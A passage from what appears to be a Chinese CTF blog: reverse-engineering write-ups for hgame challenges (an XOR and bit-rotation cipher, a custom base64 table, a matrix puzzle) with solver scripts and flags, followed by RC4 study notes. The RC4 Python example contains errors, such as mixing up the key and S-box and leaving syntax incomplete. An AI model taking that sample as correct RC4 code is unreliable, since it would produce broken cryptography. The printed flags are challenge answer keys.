‘abcdef’，转化为三个数字，0xab,0xcd,0xef</p><p>其中，v14是我们输入（除去hgame{}）的前16个字符，也就是会转成8个数字</p><p>v16是我们输入（除去hgame{}）的后16个字符，也是会转成8个数字</p><p>然后我们看到中间一大块的加密代码中间涉及的位操作，所以这边建议可以把这些十六进制转化为二进制来看</p><p>我们可以知道，与（&amp;）上0xE0，就是取前三位的意思，</p><p>而*8 这个操作相当于，*2^3^,在二进制下，也就是相当于左移3位，然后又或（|）上之前取得三位数，也就是把之前得三位加在这个左移了三位得数上，又因为这个变量是一个char型，只有1个字节，所有高位抹掉。</p><p>总而言之，这个加密第一行得操作就是将一个字节得值循环左移了三位。 </p><p>举个栗子： 0b<strong>101</strong>00011 -&gt; 0b 00011<strong>101</strong></p><p>我们再看到，与（&amp;）上0x55和与（&amp;）上0xAA分别是取这个数得奇数位和偶数位，若之后再或（|）上，其实相当于啥也没变，</p><p>而乘以2，也就相当于左移了一位，</p><p>最后我们可以将这个加密简化成这样：</p><p><img src="https://i.loli.net/2020/05/01/RuX5jicKq8IfBnA.png" alt="image-20200121164628877"></p><p>然后我们看下面的判断</p><p>其中v14是加密过后的值，再与v6（我们姑且把这个v6当作一个key，值就是上面所给的8个数字）逐位异或后，与byte_602060判断。其中byte_602060就是<img src="https://i.loli.net/2020/05/01/YLHT8BOAqpGmyfw.png" alt="img"></p><p>上面的8个字符，下面的8个字符留着判断下一段</p><p>然后v16再与v14和key逐位异或，得到值与上图下面的8个字符判断。<strong>注意，</strong>此时的v14已经是与key异或过后的值了，再次异或key，两次异或相当于没有异或，所以可以看成v16直接与原来加密过后的v14异或。</p><p>正向加密我们了解了后，我们可以逆向解密了。</p><p>首先我们知道两段字符，分别是串1：e4sy_Re_和串2：Easylif3，</p><p>step1：</p><p>首先我们把串1和key异或，就可以得到v14，然后我们将串2和v14异或可以得到v16 （或者也可以串1和串2和key异或，得到v16）</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">FLAG</span>=[]</span><br><span class="line">res14=[]</span><br><span class="line">res16=[]</span><br><span class="line">key=[<span class="string">'76'</span>,<span class="string">'60'</span>,<span class="string">'214'</span>,<span class="string">'54'</span>,<span class="string">'80'</span>,<span class="string">'136'</span>,<span class="string">'32'</span>,<span class="string">'204'</span>]</span><br><span class="line"><span class="built_in">flag</span>=<span class="string">'e4sy_Re_Easylif3'</span>.encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> range(<span class="number">0</span>,len(<span class="built_in">flag</span>),<span class="number">2</span>):</span><br><span class="line">    <span class="built_in">FLAG</span>.<span class="built_in">append</span>(<span class="built_in">flag</span>[i:i+<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> range(<span class="number">8</span>):</span><br><span class="line">    res14.<span class="built_in">append</span>(int(key[i])^int(<span class="built_in">FLAG</span>[i],<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> range(<span class="number">8</span>):</span><br><span class="line">    res16.<span class="built_in">append</span>(int(<span class="built_in">FLAG</span>[i+<span class="number">8</span>],<span class="number">16</span>)^int(res14[i]))</span><br></pre></td></tr></table></figure><p>step2:</p><p><img src="https://i.loli.net/2020/05/01/qpNTojy5nALmaks.png" alt="img"></p><p>此时我们已经知道式子左边的a1[i]，式子右边的a1[i]，只需要式子左右边的a1[i] 与 ((a2[7-i] &amp; 0xaa) &gt;&gt; 1 )  异或一遍即可</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a1=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>)<span class="symbol">:</span></span><br><span class="line">    a1.append(res14[i] ^ ((res16[<span class="number">7</span>-i] &amp; <span class="number">170</span>) <span class="meta">&gt;&gt; </span><span class="number">1</span> ))</span><br></pre></td></tr></table></figure><p>之后的操作同理，</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="built_in">i</span> in range(<span class="number">8</span>):</span><br><span class="line">    a2.append(res16[<span class="number">7</span>-<span class="built_in">i</span>] ^ ((a1[<span class="built_in">i</span>] &amp; <span class="number">85</span>) &lt;&lt; <span class="number">1</span> )<span class="comment">%256)</span></span><br><span class="line"></span><br><span class="line">a2.reverse()</span><br><span class="line"></span><br><span class="line">a1_1=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span> in range(<span class="number">8</span>):</span><br><span class="line">    a1_1.append(a1[<span class="built_in">i</span>] ^ ((a2[<span class="number">7</span>-<span class="built_in">i</span>] &amp; <span class="number">170</span>) &gt;&gt; <span class="number">1</span> ))</span><br></pre></td></tr></table></figure><p>最后之前是循环左移的，我们循环右移就可</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a_final=[]</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">i</span> in range(<span class="number">8</span>):</span><br><span class="line">    <span class="built_in">ans</span>=bin(a1_1[<span class="built_in">i</span>])[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">"0"</span>)</span><br><span class="line">    a_final.append(int(<span class="built_in">ans</span>[<span class="number">5</span>:<span class="number">8</span>]+<span class="built_in">ans</span>[<span class="number">0</span>:<span class="number">5</span>],<span class="number">2</span>))</span><br></pre></td></tr></table></figure><p>最后就可以得到flag了</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">flag</span>=<span class="string">"hgame&#123;"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> a_final:</span><br><span class="line">    <span class="built_in">flag</span>+=hex(i)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> a2:</span><br><span class="line">    <span class="built_in">flag</span>+=hex(i)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">flag</span>+=<span class="string">"&#125;"</span></span><br><span class="line">print <span class="built_in">flag</span></span><br></pre></td></tr></table></figure><h4 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h4><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">def encode():</span><br><span class="line">    s=<span class="string">'0f233e63637982d266cbf41ecb1b0102'</span></span><br><span class="line">    key=[<span class="string">'76'</span>,<span class="string">'60'</span>,<span class="string">'214'</span>,<span class="string">'54'</span>,<span class="string">'80'</span>,<span class="string">'136'</span>,<span class="string">'32'</span>,<span class="string">'204'</span>]</span><br><span class="line">    a1=[]</span><br><span class="line">    a2=[]</span><br><span class="line">    for i in range(<span class="number">0</span>,<span class="number">16</span>,<span class="number">2</span>):</span><br><span class="line">        a1.append(int(s[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">        a2.append(int(s[<span class="number">16</span>+i:<span class="number">16</span>+i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">    </span><br><span class="line">    for i in range(<span class="number">8</span>):</span><br><span class="line">        #print i</span><br><span class="line">        a1[i] = (((a1[i] &amp; <span class="number">0xE0</span>) &gt;&gt; <span class="number">5</span>) | <span class="number">8</span> * a1[i]) <span class="comment">%256    #a1循环右移3位</span></span><br><span class="line">                    </span><br><span class="line">        a1[i] = a1[i] ^ ((a2[<span class="number">7</span>-i] &amp; <span class="number">0xaa</span> ) &gt;&gt; <span class="number">1</span> ) </span><br><span class="line">                    </span><br><span class="line">        a2[<span class="number">7</span>-i] =  a2[<span class="number">7</span>-i] ^ ((a1[i] &amp; <span class="number">0x55</span>) &lt;&lt; <span class="number">1</span> )</span><br><span class="line">                    </span><br><span class="line">        a1[i] = a1[i] ^ ((a2[<span class="number">7</span>-i] &amp; <span class="number">0xaa</span>) &gt;&gt; <span class="number">1</span> ) </span><br><span class="line"></span><br><span class="line">    test=<span class="string">""</span> </span><br><span class="line">    for i in range(len(key)):</span><br><span class="line">        test+=chr(a1[i]^int(key[i]))</span><br><span class="line">    for i in range(len(key)):</span><br><span class="line">        test+=chr(a2[i]^a1[i])</span><br><span class="line">    print test</span><br><span class="line"></span><br><span class="line">encode()</span><br><span class="line"></span><br><span class="line"><span class="symbol">FLAG</span>=[]</span><br><span class="line">res14=[]</span><br><span class="line">res16=[]</span><br><span class="line">key=[<span class="string">'76'</span>,<span class="string">'60'</span>,<span class="string">'214'</span>,<span class="string">'54'</span>,<span class="string">'80'</span>,<span class="string">'136'</span>,<span class="string">'32'</span>,<span class="string">'204'</span>]</span><br><span class="line">flag=<span class="string">'e4sy_Re_Easylif3'</span>.encode(<span class="string">'hex'</span>)</span><br><span class="line">for i in range(<span class="number">0</span>,len(flag),<span class="number">2</span>):</span><br><span class="line">    <span class="symbol">FLAG</span>.append(flag[i:i+<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">for i in range(<span class="number">8</span>):</span><br><span class="line">    res14.append(int(key[i])^int(<span class="symbol">FLAG</span>[i],<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">for i in range(<span class="number">8</span>):</span><br><span class="line">    res16.append(int(<span class="symbol">FLAG</span>[i+<span class="number">8</span>],<span class="number">16</span>)^int(res14[i]))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a1=[]</span><br><span class="line">a2=[]</span><br><span class="line">for i in range(<span class="number">8</span>):</span><br><span class="line">    a1.append(res14[i] ^ ((res16[<span class="number">7</span>-i] &amp; <span class="number">170</span>) &gt;&gt; <span class="number">1</span> ))</span><br><span class="line"></span><br><span class="line">for i in range(<span class="number">8</span>):</span><br><span class="line">    a2.append(res16[<span class="number">7</span>-i] ^ ((a1[i] &amp; <span class="number">85</span>) &lt;&lt; <span class="number">1</span> )<span class="comment">%256)</span></span><br><span class="line"></span><br><span class="line">a2.reverse()</span><br><span class="line"></span><br><span class="line">a1_1=[]</span><br><span class="line"></span><br><span class="line">for i in range(<span class="number">8</span>):</span><br><span class="line">    a1_1.append(a1[i] ^ ((a2[<span class="number">7</span>-i] &amp; <span class="number">170</span>) &gt;&gt; <span class="number">1</span> ))</span><br><span class="line"></span><br><span class="line">a_final=[]</span><br><span class="line">for i in range(<span class="number">8</span>):</span><br><span class="line">    ans=bin(a1_1[i])[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">"0"</span>)</span><br><span class="line">    a_final.append(int(ans[<span class="number">5</span>:<span class="number">8</span>]+ans[<span class="number">0</span>:<span class="number">5</span>],<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">flag=<span class="string">"hgame&#123;"</span></span><br><span class="line">for i in a_final:</span><br><span class="line">    flag+=hex(i)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line">for i in a2:</span><br><span class="line">    flag+=hex(i)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line">flag+=<span class="string">"&#125;"</span></span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><p>运行得到flag：hgame{0f233e63637982d266cbf41ecb1b0102}</p><h3 id="advance"><a href="#advance" class="headerlink" title="advance"></a>advance</h3><h4 id="题目介绍：-19"><a href="#题目介绍：-19" class="headerlink" title="题目介绍："></a>题目介绍：</h4><p> “高级加密算法” </p><h4 id="解题思路：-19"><a href="#解题思路：-19" class="headerlink" title="解题思路："></a>解题思路：</h4><p>看题目还以为是AES加密</p><p>首先运行下程序</p><p><img src="https://i.loli.net/2020/05/01/fni1Mub3rqZ6yNW.png" alt="image-20200121171024621"></p><p>放进ida，发现去掉了符号表，找不到main函数甚至</p><p>那我们就查找一下‘try again’字符</p><p>得到核心代码部分</p><p>可以看到，与输入有关的函数有三个，分别是sub_140002030，sub_140002000，sub_140001EB0</p><p>但是稍微有点经验，或者是实现过base64加密的选手很容易就能看出这就是个base64加密</p><p>所以这个加密就是base64加密了，而这里的aAbcdefghijklmn显然就是这个加密的密码表的</p><p>双击得到密码表：</p><p>是将正常的base64表换了个顺序，</p><p>直接编写或者找一个base64解密脚本即可得到flag</p><h4 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base64_decode</span><span class="params">(s, dictionary)</span>:</span></span><br><span class="line">    base64inv = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(dictionary)):</span><br><span class="line">        base64inv[dictionary[i]] = i</span><br><span class="line"></span><br><span class="line">    s = s.replace(<span class="string">"\n"</span>, <span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.match(<span class="string">r"^([&#123;alphabet&#125;]&#123;&#123;4&#125;&#125;)*([&#123;alphabet&#125;]&#123;&#123;3&#125;&#125;=|[&#123;alphabet&#125;]&#123;&#123;2&#125;&#125;==)?$"</span>.format(alphabet = dictionary), s):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"Invalid input: &#123;&#125;"</span>.format(s))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(s) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">    p = <span class="string">""</span> <span class="keyword">if</span> (s[<span class="number">-1</span>] != <span class="string">"="</span>) <span class="keyword">else</span> <span class="string">"AA"</span> <span class="keyword">if</span> (len(s) &gt; <span class="number">1</span> <span class="keyword">and</span> s[<span class="number">-2</span>] == <span class="string">"="</span>) <span class="keyword">else</span> <span class="string">"A"</span></span><br><span class="line">    r = <span class="string">""</span></span><br><span class="line">    s = s[<span class="number">0</span>:len(s) - len(p)] + p</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">4</span>):</span><br><span class="line">        n = (base64inv[s[c]] &lt;&lt; <span class="number">18</span>) + (base64inv[s[c+<span class="number">1</span>]] &lt;&lt; <span class="number">12</span>) + (base64inv[s[c+<span class="number">2</span>]] &lt;&lt; <span class="number">6</span>) + base64inv[s[c+<span class="number">3</span>]]</span><br><span class="line">        r += chr((n &gt;&gt; <span class="number">16</span>) &amp; <span class="number">255</span>) + chr((n &gt;&gt; <span class="number">8</span>) &amp; <span class="number">255</span>) + chr(n &amp; <span class="number">255</span>)</span><br><span class="line">    <span class="keyword">return</span> r[<span class="number">0</span>:len(r) - len(p)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(dictionary)</span>:</span></span><br><span class="line">    print(base64_decode(<span class="string">"0g371wvVy9qPztz7xQ+PxNuKxQv74B/5n/zwuPfX"</span>, dictionary), end=<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    dictionary = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span><br><span class="line">    show(dictionary)</span><br></pre></td></tr></table></figure><p>得到flag：hgame{b45e6a_i5_50_eazy_6VVSQ}</p><h3 id="cpp"><a href="#cpp" class="headerlink" title="cpp"></a>cpp</h3><h4 id="题目介绍：-20"><a href="#题目介绍：-20" class="headerlink" title="题目介绍："></a>题目介绍：</h4><p> easy cpp hint: 翻开线代课本看看 </p><h4 id="解题思路：-20"><a href="#解题思路：-20" class="headerlink" title="解题思路："></a>解题思路：</h4><p>这一道题是连蒙带猜的一道题，本身cpp的静态分析就很难看，出题人还去掉了符号表。（而且本人还没学过cpp，所以这一题讲得不会很清楚）</p><p>自己也是刚接触二进制，动态调试也不太会，所以。。。。</p><p><img src="https://i.loli.net/2020/05/01/X2CI93SYHnK6zDE.png" alt="img"></p><p>所以我们解密只需要先求出矩阵v21的逆矩阵</p><p>推荐一个在线矩阵运算的<a href="https://matrixcalc.org/zh/" target="_blank" rel="noopener">网站</a></p><p><img src="https://i.loli.net/2020/05/01/sICPQybD3AHehFz.png" alt="img"></p><p>然后矩阵v30右乘这个矩阵就可以得到我们应该的输入矩阵</p><p><img src="https://i.loli.net/2020/05/01/q9rdYcfiNSoJG4P.png" alt="img"></p><p>所以flag就是：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;<span class="number">-24840</span>_<span class="number">-78193</span>_51567_2556_<span class="number">-26463</span>_26729_3608_<span class="number">-25933</span>_25943&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛小屋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学学习笔记 之 RC4与SM4</title>
      <link href="/2020/01/30/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BRC4%E4%B8%8ESM4/"/>
      <url>/2020/01/30/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BRC4%E4%B8%8ESM4/</url>
      
        <content type="html"><![CDATA[<h1 id="Rc4"><a href="#Rc4" class="headerlink" title="Rc4"></a>Rc4</h1><p>在今年寒假hgame week2的密码学中有一道notRC4的题目，说是notRC4，其实整个加密流程还是RC4，所以借此机会学习一下RC4加密。</p><h2 id="Rc4简介"><a href="#Rc4简介" class="headerlink" title="Rc4简介"></a>Rc4简介</h2><p>​        在密码学中，RC4（来自Rivest Cipher 4的缩写）是一种流加密算法，由于加解密使用相同的密钥，因此也属于对称加密算法。但是由于RC4算法存在弱点，2015年2月所发布的 RFC 7465 规定禁止在TLS中使用RC4加密算法。</p><p>​        RC4由伪随机数生成器和异或运算组成。RC4的密钥长度可变，范围是[1,255]。RC4一个字节一个字节地加解密。给定一个密钥，伪随机数生成器接受密钥并产生一个S盒。S盒用来加密数据，而且在加密过程中S盒会变化。</p><p>由于异或运算的对合性，RC4加密解密使用同一套算法。</p><p> 2015年，比利時魯汶大學的研究人員Mathy Vanhoef及Frank Piessens，公布了針對RC4加密算法的新型攻擊程式，可在75小時內取得cookie的內容。 </p><h2 id="RC4加密流程"><a href="#RC4加密流程" class="headerlink" title="RC4加密流程"></a>RC4加密流程</h2><h3 id="初始化算法（KSA）"><a href="#初始化算法（KSA）" class="headerlink" title="初始化算法（KSA）"></a>初始化算法（KSA）</h3><p>首先生成一个key，内容随便定义</p><p>然后将key拓展成256位，用key本身来填充，</p><p>举个栗子：如果选择key=‘vanish’,拓展后的key即为‘vanishvanishvanish……vani’  (长度为256)</p><p>然后生成一个S盒，S盒有256个元素，分别是0，1，2，……，255</p><p>接着利用key初始化（打乱）S盒，</p><p>初始化的伪代码：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">j </span>= <span class="number">0</span></span><br><span class="line">for( i=<span class="number">0</span> <span class="comment">; i&lt;256 ; i++)</span></span><br><span class="line">    <span class="keyword">j </span>= (<span class="keyword">j </span>+ S[i] + key[i]) % <span class="number">256</span></span><br><span class="line">    <span class="keyword">swap </span>(s[i],s[<span class="keyword">j])</span><span class="comment"># 交换s[i]和s[j]的值，生成一个新的S盒</span></span><br><span class="line">endfor</span><br></pre></td></tr></table></figure><p>可以看到，由于未初始化的S盒都是确定的，所以j可以看作只受key的值的影响，并且j的值具有“遗传性”，就是会影响后面的j的值，所以，就算只是改动key的某一个值，经过256次变化后的S盒也会由很大不同。</p><p>整个初始化抽象一点过程就是，S盒的每一个元素都会和自身的某一个元素进行交换，而和谁交换则由key来决定</p><h3 id="伪随机子密码生成算法（PRGA-、加密阶段"><a href="#伪随机子密码生成算法（PRGA-、加密阶段" class="headerlink" title="伪随机子密码生成算法（PRGA)、加密阶段"></a>伪随机子密码生成算法（PRGA)、加密阶段</h3><p>伪代码：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">j </span>= <span class="number">0</span></span><br><span class="line">for (i=<span class="number">0</span> <span class="comment">;i&lt;len(input);i++):</span></span><br><span class="line">    i = (i + <span class="number">1</span>) mod <span class="number">256</span>  </span><br><span class="line">    <span class="keyword">j </span>= (<span class="keyword">j </span>+ S[i]) mod <span class="number">256</span> <span class="comment">#j的值受S盒影响</span></span><br><span class="line">    <span class="keyword">swap </span>(s[i],s[<span class="keyword">j])</span><span class="comment"># 交换s[i]和s[j]的值，生成一个新的S盒</span></span><br><span class="line">    k = input[i] ^ S[(S[i] + S[<span class="keyword">j]) </span>% <span class="number">256</span>]<span class="comment">#对明文的一个字节进行加密</span></span><br><span class="line">    output K</span><br><span class="line">endwhile</span><br></pre></td></tr></table></figure><p>可以看到，伪随机的子密码的生成只受初始化后的S盒的影响，要加密的明文并不会影响密钥。</p><p>从这里便可以看出RC4是一个对称加密，只要拥有初始化后的S盒。那么密钥便是固定的。明文流和密钥流异或得到密文流，密文流和密钥流异或便得到明文流。</p><h2 id="python代码实现："><a href="#python代码实现：" class="headerlink" title="python代码实现："></a>python代码实现：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建S盒</span></span><br><span class="line">s=[<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    s[i]=i</span><br><span class="line">    </span><br><span class="line"><span class="comment">#拓展key</span></span><br><span class="line">key=<span class="string">""</span></span><br><span class="line">k=[<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    k[i]=key[(i)mod(len(key)]</span><br><span class="line">    </span><br><span class="line"><span class="comment">#初始化S盒</span></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">j = (j+s[i]+s[j])%<span class="number">256</span></span><br><span class="line">    s[i],s[j] = s[j],s[i]</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成密钥，加密明文  </span></span><br><span class="line">message=<span class="string">""</span> </span><br><span class="line">cipher</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(message))</span><br><span class="line">    i = (i + <span class="number">1</span>)%<span class="number">256</span> </span><br><span class="line">    j = (j + s[i])%<span class="number">256</span></span><br><span class="line">    s[i],s[j] = s[j],s[i]</span><br><span class="line">    t = (s[i] + s[j])%<span class="number">256</span></span><br><span class="line">    cipher += message[i]^s[t]</span><br></pre></td></tr></table></figure><h2 id="实例：hgame-week2-notRC4"><a href="#实例：hgame-week2-notRC4" class="headerlink" title="实例：hgame-week2 notRC4"></a>实例：hgame-week2 notRC4</h2><p>题目：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">from hashlib import md5</span><br><span class="line">from secret import flag</span><br><span class="line">assert flag.startswith(b<span class="string">'hgame) and flag.endswith(b'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Oo0</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.O<span class="number">0</span> = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">        <span class="keyword">self</span>.Ooo = <span class="number">0</span></span><br><span class="line">        <span class="keyword">self</span>.Ooo<span class="number">0</span> = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)<span class="symbol">:</span></span><br><span class="line">            <span class="keyword">self</span>.O<span class="number">0</span>[i] = i</span><br><span class="line">        <span class="keyword">self</span>.oO<span class="number">0</span> = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">OO0</span><span class="params">(<span class="keyword">self</span>, 